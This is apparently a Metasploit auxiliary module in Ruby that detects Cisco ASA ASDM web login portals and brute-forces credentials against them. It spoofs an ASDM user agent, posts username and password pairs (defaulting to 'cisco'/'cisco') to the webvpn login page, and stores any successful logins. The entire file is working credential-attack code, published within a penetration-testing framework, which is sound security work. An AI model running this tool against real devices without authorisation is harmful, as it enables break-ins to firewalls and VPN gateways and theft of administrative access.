##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco ASA ASDM Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Cisco ASA ASDM web login portals and
        performs login brute force to identify valid credentials.
      },
      'Author'         =>
        [
          'Jonathan Claudius <jclaudius[at]trustwave.com>',
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('USERNAME', [true, "A specific username to authenticate as", 'cisco']),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'cisco'])
      ])
  end

  def run_host(ip)
    unless check_conn?
      print_error("Connection failed, Aborting...")
      return
    end

    unless is_app_asdm?
      print_error("Application does not appear to be Cisco ASA ASDM. Module will not continue.")
      return
    end

    print_status("Application appears to be Cisco ASA ASDM. Module will continue.")

    print_status("Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  # Verify whether the connection is working or not
  def check_conn?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
      print_good("Server is responsive...")
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      return
    end
  end

  # Verify whether we're working with ASDM or not
  def is_app_asdm?
      res = send_request_cgi(
      {
        'uri'       => '/+webvpn+/index.html',
        'method'    => 'GET',
        'agent'     => 'ASDM/ Java/1.6.0_65'
      })

      if res &&
         res.code == 200 &&
         res.get_cookies.include?('webvpn')

        return true
      else
        return false
      end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'Cisco ASA ASDM',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Brute-force the login page
  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi({
        'uri'       => '/+webvpn+/index.html',
        'method'    => 'POST',
        'agent'     => 'ASDM/ Java/1.6.0_65',
        'ctype'     => 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie'    => 'webvpnlogin=1; tg=0DefaultADMINGroup',
        'vars_post' => {
          'username' => user,
          'password' => pass,
          'tgroup'   => 'DefaultADMINGroup'
        }
      })

      if res &&
         res.code == 200 &&
         res.body.match(/SSL VPN Service/) &&
         res.body.match(/Success/) &&
         res.body.match(/success/)

        print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")

        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
        return :next_user

      else
        vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end
